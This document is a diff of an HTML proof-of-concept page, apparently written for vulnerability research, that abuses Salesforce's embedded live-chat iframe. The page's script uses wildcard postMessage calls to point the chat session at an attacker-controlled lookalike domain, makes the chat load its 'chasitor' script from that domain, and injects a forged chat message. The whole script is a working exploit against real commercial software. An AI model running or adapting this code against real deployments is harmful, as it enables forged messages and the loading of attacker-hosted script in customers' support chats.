@@ -1,54 +1,56 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>Salesforce Live Chat Message Injection PoC</h2>
+    <h2>Salesforce iframe abuse PoC</h2>
     <iframe id="chatframe" src="https://service.force.com/embeddedservice/4.0/esw.html?deploymentId=5725c000000XcUT" width="800" height="600"></iframe>
 
     <script>
-      const domain = "reddit.com.wangdubruh.xyz"; // Your attacker subdomain
-      const deploymentId = "575ctest123"; // Can be anything (used to separate sessions)
-
+      const domain = "reddit.com.wangdubruh.xyz"; // Must match your subdomain
+      const deploymentId = "test123";
       const frame = document.getElementById("chatframe");
 
+      let ready = false;
+
       window.addEventListener("message", (e) => {
-        if (typeof e.data === "object") {
-          console.log("[📩] Message from iframe:", e.data);
+        if (typeof e.data === "object" && e.data.method === "session.onLoad") {
+          console.log("📩 Message from iframe:", e.data);
+          ready = true;
+
+          console.log("📤 Setting domain using session.updateStorage...");
+          frame.contentWindow.postMessage({
+            method: "session.updateStorage",
+            domain: domain,
+            data: {
+              deploymentId: deploymentId,
+              isSamePageNavigation: true,
+              isRefresh: false
+            }
+          }, "*");
+
+          // Step 2: Wait 1 second and load chasitor
+          setTimeout(() => {
+            console.log("📤 Sending script.load for feature: chasitor");
+            frame.contentWindow.postMessage({
+              method: "script.load",
+              domain: domain,
+              feature: "chasitor"
+            }, "*");
+          }, 1000);
+
+          // Step 3: Wait 2 seconds and send fake message
+          setTimeout(() => {
+            console.log("📤 Sending fake message");
+            frame.contentWindow.postMessage({
+              method: "chasitor.sendMessage",
+              domain: domain,
+              data: "[💥 Attacker PoC] This is a forged message via iframe"
+            }, "*");
+          }, 2000);
         }
       });
 
       frame.onload = () => {
         console.log("[+] Iframe loaded (Salesforce 4.0)");
-
-        // Step 1: Set domain
-        frame.contentWindow.postMessage({
-          method: "session.updateStorage",
-          domain: domain,
-          data: {
-            deploymentId: deploymentId,
-            isSamePageNavigation: true,
-            isRefresh: false
-          }
-        }, "*");
-
-        // Step 2: Load chasitor script (1 sec delay)
-        setTimeout(() => {
-          console.log("[📤] Sending script.load for feature: chasitor");
-          frame.contentWindow.postMessage({
-            method: "script.load",
-            domain: domain,
-            feature: "chasitor"
-          }, "*");
-        }, 1000);
-
-        // Step 3: Inject message (after 2.5 sec total)
-        setTimeout(() => {
-          console.log("[📤] Sending fake message");
-          frame.contentWindow.postMessage({
-            method: "chasitor.sendMessage",
-            domain: domain,
-            data: "[Attacker]: This is a test attack message from your PoC"
-          }, "*");
-        }, 2500);
       };
     </script>
   </body>
